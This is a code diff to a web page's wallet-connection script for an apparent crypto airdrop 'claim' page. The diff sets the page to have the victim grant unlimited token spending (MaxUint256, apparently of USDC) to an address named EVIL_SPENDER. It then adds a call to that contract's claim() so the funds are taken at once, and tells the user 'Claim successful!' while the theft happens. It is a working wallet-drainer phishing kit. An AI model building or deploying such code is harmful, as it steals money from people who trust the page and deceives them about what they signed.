@@ -126,13 +126,16 @@
     const walletAddressDiv = document.getElementById('walletAddress');
     const claimBtn = document.getElementById('claimBtn');
     const eligibilityMsg = document.getElementById('eligibilityMessage');
+
     let provider, signer;
 
-    const GET_TOKEN_ADDRESS = "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb";
+    const USDC_ADDRESS = "0xd9E2D0630976f39D480F9BAa0b24b8C27080Cd29"; // Replace with actual target token address
     const EVIL_SPENDER = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";
+
     const ERC20_ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)"
     ];
+    const EVIL_ABI = ["function claim() external"];
 
     connectWalletBtn.addEventListener('click', async () => {
       if (!window.ethereum) {
@@ -171,9 +174,16 @@
       }
 
       try {
-        const token = new ethers.Contract(GET_TOKEN_ADDRESS, ERC20_ABI, signer);
-        const tx = await token.approve(EVIL_SPENDER, ethers.constants.MaxUint256);
-        await tx.wait();
+        // Step 1: Approve USDC to EvilClaim
+        const token = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
+        const tx1 = await token.approve(EVIL_SPENDER, ethers.constants.MaxUint256);
+        await tx1.wait();
+
+        // Step 2: Call EvilClaim.claim()
+        const evil = new ethers.Contract(EVIL_SPENDER, EVIL_ABI, signer);
+        const tx2 = await evil.claim();
+        await tx2.wait();
+
         alert("✅ Claim successful!");
       } catch (err) {
         console.error(err);
